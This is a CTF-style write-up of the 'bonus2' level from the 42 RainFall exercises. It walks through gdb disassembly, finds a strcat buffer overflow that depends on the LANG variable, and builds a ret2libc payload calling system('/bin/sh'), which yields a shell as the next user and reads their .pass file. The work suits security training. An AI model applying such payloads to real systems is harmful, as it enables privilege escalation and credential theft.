# Bonus 2

First step - testing the program

	$ ./bonus2
	$ ./bonus2 coucou
	$ ./bonus2 coucou coucou
	Hello coucou
	$ ./bonus2 coucou coucou coucou

The program print the second parameter

Start in GDB

	gdb-peda$ pdisas main
	Dump of assembler code for function main:
	   0x08048529 <+0>:		push   ebp
	   0x0804852a <+1>:		mov    ebp,esp
	   0x0804852c <+3>:		push   edi
	   0x0804852d <+4>:		push   esi
	   0x0804852e <+5>:		push   ebx
	   0x0804852f <+6>:		and    esp,0xfffffff0
	   0x08048532 <+9>:		sub    esp,0xa0
	   0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3
	   0x0804853c <+19>:	je     0x8048548 <main+31>
	   0x0804853e <+21>:	mov    eax,0x1
	   0x08048543 <+26>:	jmp    0x8048630 <main+263>
	   0x08048548 <+31>:	lea    ebx,[esp+0x50]
	   0x0804854c <+35>:	mov    eax,0x0
	   0x08048551 <+40>:	mov    edx,0x13
	   0x08048556 <+45>:	mov    edi,ebx
	   0x08048558 <+47>:	mov    ecx,edx
	   0x0804855a <+49>:	rep stos DWORD PTR es:[edi],eax
	   0x0804855c <+51>:	mov    eax,DWORD PTR [ebp+0xc]
	   0x0804855f <+54>:	add    eax,0x4
	   0x08048562 <+57>:	mov    eax,DWORD PTR [eax]
	   0x08048564 <+59>:	mov    DWORD PTR [esp+0x8],0x28
	   0x0804856c <+67>:	mov    DWORD PTR [esp+0x4],eax
	   0x08048570 <+71>:	lea    eax,[esp+0x50]
	   0x08048574 <+75>:	mov    DWORD PTR [esp],eax
	   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
	   0x0804857c <+83>:	mov    eax,DWORD PTR [ebp+0xc]
	   0x0804857f <+86>:	add    eax,0x8
	   0x08048582 <+89>:	mov    eax,DWORD PTR [eax]
	   0x08048584 <+91>:	mov    DWORD PTR [esp+0x8],0x20
	   0x0804858c <+99>:	mov    DWORD PTR [esp+0x4],eax
	   0x08048590 <+103>:	lea    eax,[esp+0x50]
	   0x08048594 <+107>:	add    eax,0x28
	   0x08048597 <+110>:	mov    DWORD PTR [esp],eax
	   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
	   0x0804859f <+118>:	mov    DWORD PTR [esp],0x8048738
	   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
	   0x080485ab <+130>:	mov    DWORD PTR [esp+0x9c],eax
	   0x080485b2 <+137>:	cmp    DWORD PTR [esp+0x9c],0x0
	   0x080485ba <+145>:	je     0x8048618 <main+239>
	   0x080485bc <+147>:	mov    DWORD PTR [esp+0x8],0x2
	   0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d
	   0x080485cc <+163>:	mov    eax,DWORD PTR [esp+0x9c]
	   0x080485d3 <+170>:	mov    DWORD PTR [esp],eax
	   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
	   0x080485db <+178>:	test   eax,eax
	   0x080485dd <+180>:	jne    0x80485eb <main+194>
	   0x080485df <+182>:	mov    DWORD PTR ds:0x8049988,0x1
	   0x080485e9 <+192>:	jmp    0x8048618 <main+239>
	   0x080485eb <+194>:	mov    DWORD PTR [esp+0x8],0x2
	   0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740
	   0x080485fb <+210>:	mov    eax,DWORD PTR [esp+0x9c]
	   0x08048602 <+217>:	mov    DWORD PTR [esp],eax
	   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
	   0x0804860a <+225>:	test   eax,eax
	   0x0804860c <+227>:	jne    0x8048618 <main+239>
	   0x0804860e <+229>:	mov    DWORD PTR ds:0x8049988,0x2
	   0x08048618 <+239>:	mov    edx,esp
	   0x0804861a <+241>:	lea    ebx,[esp+0x50]
	   0x0804861e <+245>:	mov    eax,0x13
	   0x08048623 <+250>:	mov    edi,edx
	   0x08048625 <+252>:	mov    esi,ebx
	   0x08048627 <+254>:	mov    ecx,eax
	   0x08048629 <+256>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
	   0x0804862b <+258>:	call   0x8048484 <greetuser>
	   0x08048630 <+263>:	lea    esp,[ebp-0xc]
	   0x08048633 <+266>:	pop    ebx
	   0x08048634 <+267>:	pop    esi
	   0x08048635 <+268>:	pop    edi
	   0x08048636 <+269>:	pop    ebp
	   0x08048637 <+270>:	ret
	End of assembler dump.


Lot of things

- 2 call to strncpy, maybe can overflow

- 2 memcmp for compare an env variable "LANG" with "fi" and "nl":

	0x080485bc <+147>:	mov    DWORD PTR [esp+0x8],0x2
	0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d <--- "fi"
	0x080485cc <+163>:	mov    eax,DWORD PTR [esp+0x9c]
	0x080485d3 <+170>:	mov    DWORD PTR [esp],eax
	0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>

	0x080485eb <+194>:	mov    DWORD PTR [esp+0x8],0x2
	0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740 <--- "nl"
	0x080485fb <+210>:	mov    eax,DWORD PTR [esp+0x9c]
	0x08048602 <+217>:	mov    DWORD PTR [esp],eax
	0x08048605 <+220>:	call   0x8048360 <memcmp@plt>

- a call to "greetuser" function


	gdb-peda$ pdisas greetuser
	Dump of assembler code for function greetuser:
	   0x08048484 <+0>:		push   ebp
	   0x08048485 <+1>:		mov    ebp,esp
	   0x08048487 <+3>:		sub    esp,0x58
	   0x0804848a <+6>:		mov    eax,ds:0x8049988
	   0x0804848f <+11>:	cmp    eax,0x1
	   0x08048492 <+14>:	je     0x80484ba <greetuser+54>
	   0x08048494 <+16>:	cmp    eax,0x2
	   0x08048497 <+19>:	je     0x80484e9 <greetuser+101>
	   0x08048499 <+21>:	test   eax,eax
	   0x0804849b <+23>:	jne    0x804850a <greetuser+134>
	   0x0804849d <+25>:	mov    edx,0x8048710
	   0x080484a2 <+30>:	lea    eax,[ebp-0x48]
	   0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx]
	   0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx
	   0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+0x4]
	   0x080484ad <+41>:	mov    WORD PTR [eax+0x4],cx
	   0x080484b1 <+45>:	movzx  edx,BYTE PTR [edx+0x6]
	   0x080484b5 <+49>:	mov    BYTE PTR [eax+0x6],dl
	   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>
	   0x080484ba <+54>:	mov    edx,0x8048717
	   0x080484bf <+59>:	lea    eax,[ebp-0x48]
	   0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]
	   0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx
	   0x080484c6 <+66>:	mov    ecx,DWORD PTR [edx+0x4]
	   0x080484c9 <+69>:	mov    DWORD PTR [eax+0x4],ecx
	   0x080484cc <+72>:	mov    ecx,DWORD PTR [edx+0x8]
	   0x080484cf <+75>:	mov    DWORD PTR [eax+0x8],ecx
	   0x080484d2 <+78>:	mov    ecx,DWORD PTR [edx+0xc]
	   0x080484d5 <+81>:	mov    DWORD PTR [eax+0xc],ecx
	   0x080484d8 <+84>:	movzx  ecx,WORD PTR [edx+0x10]
	   0x080484dc <+88>:	mov    WORD PTR [eax+0x10],cx
	   0x080484e0 <+92>:	movzx  edx,BYTE PTR [edx+0x12]
	   0x080484e4 <+96>:	mov    BYTE PTR [eax+0x12],dl
	   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
	   0x080484e9 <+101>:	mov    edx,0x804872a
	   0x080484ee <+106>:	lea    eax,[ebp-0x48]
	   0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx]
	   0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx
	   0x080484f5 <+113>:	mov    ecx,DWORD PTR [edx+0x4]
	   0x080484f8 <+116>:	mov    DWORD PTR [eax+0x4],ecx
	   0x080484fb <+119>:	mov    ecx,DWORD PTR [edx+0x8]
	   0x080484fe <+122>:	mov    DWORD PTR [eax+0x8],ecx
	   0x08048501 <+125>:	movzx  edx,WORD PTR [edx+0xc]
	   0x08048505 <+129>:	mov    WORD PTR [eax+0xc],dx
	   0x08048509 <+133>:	nop
	   0x0804850a <+134>:	lea    eax,[ebp+0x8]
	   0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax
	   0x08048511 <+141>:	lea    eax,[ebp-0x48]
	   0x08048514 <+144>:	mov    DWORD PTR [esp],eax
	   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
	   0x0804851c <+152>:	lea    eax,[ebp-0x48]
	   0x0804851f <+155>:	mov    DWORD PTR [esp],eax
	   0x08048522 <+158>:	call   0x8048390 <puts@plt>
	   0x08048527 <+163>:	leave
	   0x08048528 <+164>:	ret
	End of assembler dump.

There is a call to strcat, we can overflow here

(gdb-peda)$ info function
...
0x08048460  frame_dummy
0x08048484  greetuser
...

One other function "frame_dummy"

	gdb-peda$ pdisas frame_dummy
	Dump of assembler code for function frame_dummy:
	   0x08048460 <+0>:		push   ebp
	   0x08048461 <+1>:		mov    ebp,esp
	   0x08048463 <+3>:		sub    esp,0x18
	   0x08048466 <+6>:		mov    eax,ds:0x8049880
	   0x0804846b <+11>:	test   eax,eax
	   0x0804846d <+13>:	je     0x8048481 <frame_dummy+33>
	   0x0804846f <+15>:	mov    eax,0x0
	   0x08048474 <+20>:	test   eax,eax
	   0x08048476 <+22>:	je     0x8048481 <frame_dummy+33>
	   0x08048478 <+24>:	mov    DWORD PTR [esp],0x8049880
	   0x0804847f <+31>:	call   eax
	   0x08048481 <+33>:	leave
	   0x08048482 <+34>:	ret
	   0x08048483 <+35>:	nop
	End of assembler dump.

Do nothing

Try to overflow the strcat with a pattern

	(gdb-peda)$ r coucou $(cat file)
	Starting program: /home/nico/42/rainfall/bonus2/Ressources/bonus2 coucou $(cat file)
	Hello coucou
	[Inferior 1 (process 68280) exited with code 015]
	Warning: not running

Nope

	(gdb-peda)$ r $(cat file) coucou
	Starting program: /home/nico/42/rainfall/bonus2/Ressources/bonus2 $(cat file) coucou
	Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAacoucou
	[Inferior 1 (process 68288) exited with code 065]
	Warning: not running

Nope

	gdb-peda$ r $(cat file) $(cat file)
	Starting program: /home/nico/42/rainfall/bonus2/Ressources/bonus2 $(cat file) $(cat file)
	Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAAA%AAsAABAA$AAnAACAA-AA(AADAA;A

	Program received signal SIGSEGV, Segmentation fault.

Segfault!

	(gdb-peda)$ pattern search
	Registers contain pattern buffer:
	EBP+0 found at offset: 26
	....

We don't have EIP

First, search the good argument for the overflow with 2 different pattern

	(gdb-peda)$ r $(python -c 'print "B"*200') $(cat file)
	Starting program: /home/nico/42/rainfall/bonus2/Ressources/bonus2 $(python -c 'print "B"*200') $(cat file)
	Hello BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAA%AAsAABAA$AAnAACAA-AA(AADAA;A

	Program received signal SIGSEGV, Segmentation fault.
	....
	EBP: 0x41414441 ('ADAA') <---- gdb patter
	....
	Stopped reason: SIGSEGV
	0x0800413b in ?? ()

Not the first arg

	(gdb-peda)$ r $(cat file) $(python -c 'print "B"*200')
	Starting program: /home/nico/42/rainfall/bonus2/Ressources/bonus2 $(cat file) $(python -c 'print "B"*200')
	Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

	Program received signal SIGSEGV, Segmentation fault.
	....
	EBP: 0x42424242 ('BBBB') <---- Good
	....
	Stopped reason: SIGSEGV
	0x08004242 in ?? ()

It's in the second argument

The check on the LANG env variable is stored on a global variable "language" and has an influence on some parts of the function "greetuser"

Let's try with "fil" in LANG

	$ export LANG="fi"
	$ echo $LANG
	fi

	(gdb-peda)$ r $(python -c 'print "A"*200') $(cat file)
	Starting program: /home/nico/42/rainfall/bonus2/Ressources/bonus2 $(python -c 'print "A"*200') $(cat file)
	Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%AAsAABAA$AAnAACAA-AA(AADAA;A

	Program received signal SIGSEGV, Segmentation fault.

	(gdb-peda)$ pattern search
	Registers contain pattern buffer:
	EBP+0 found at offset: 14
	EIP+0 found at offset: 18

We have EIP! at offset 18

	(gdb-peda)$ r $(python -c 'print "A"*200') $(python -c 'print "B"*22')
	Starting program: /home/nico/42/rainfall/bonus2/Ressources/bonus2 $(python -c 'print "A"*200') $(python -c 'print "B"*22')
	Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBB

	Program received signal SIGSEGV, Segmentation fault.
	...
	EIP: 0x42424242 ('BBBB')
	....
	Stopped reason: SIGSEGV
	0x42424242 in ?? ()

It's correct

Let's check if we can do a ret2libc : need the address of :

- "system"
- a "/bin/sh" string

Let's check if we have a "/bin/sh" string, if not we will add it in the env

	(gdb-peda)$ find "/bin/sh"
	Searching for '/bin/sh' in: None ranges
	Found 1 results, display max 1 items:
	libc : 0xf7f52f68 ("/bin/sh")

Ok, there is the string "/bin/sh"

Let's go in the vm and exploit like this

	(gdb) b *main+258
	(gdb) r

	(gdb) info proc map
	process 4310
	Mapped address spaces:

		Start Addr   End Addr       Size     Offset objfile
		 0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
		 0x8049000  0x804a000     0x1000        0x0 /home/user/bonus2/bonus2
		 0x804a000  0x806b000    0x21000        0x0 [heap]
		0xb7e2b000 0xb7e2c000     0x1000        0x0
		0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
		0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
		0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
		0xb7fd2000 0xb7fd5000     0x3000        0x0
		0xb7fdb000 0xb7fdd000     0x2000        0x0
		0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
		0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
		0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
		0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
		0xbffdf000 0xc0000000    0x21000        0x0 [stack]

Search in the libc.so, start at "0xb7e2c000", end at "0xb7fcf000"

	(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
	0xb7f8cc58
	1 pattern found.

	(gdb) x/s 0xb7f8cc58
	0xb7f8cc58:	 "/bin/sh"

We have the address of "/bin/sh" string : 0xb7f8cc58


	(gdb) info function system
	All functions matching regular expression "system":

	Non-debugging symbols:
	0xb7e6b060  __libc_system
	0xb7e6b060  system
	0xb7f49550  svcerr_systemerr

The address of "system" is "0xb7e6b060"

We can do it properly with "exit" instead of junk in the ret address

	(gdb) info function exit
	All functions matching regular expression "exit":

	Non-debugging symbols:
	0xb7e5ebe0  exit
	0xb7e5ec10  on_exit
	0xb7e5ee20  __cxa_atexit
	0xb7e5efc0  quick_exit
	0xb7e5eff0  __cxa_at_quick_exit
	0xb7ee41d8  _exit
	0xb7f28500  pthread_exit
	0xb7f2dc10  __cyg_profile_func_exit
	0xb7f4c750  svc_exit
	0xb7f56c80  atexit

The address of "exit" is "0xb7e5ebe0"

Let's build the payload

	("B" * 18) + (EIP = system address) + (RET = exit address) + ("/bin/sh" address)

	python -c 'print "B"*18+"\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7"'

Don't forget the env variable LANG

	$ export LANG="fil"

	$ ./bonus2 $(python -c 'print "A"*200') $(python -c 'print "B"*18+"\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7"')
	Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB`�����X���

	$ whoami
	bonus3

	$ cat ~bonus3/.pass

Good!
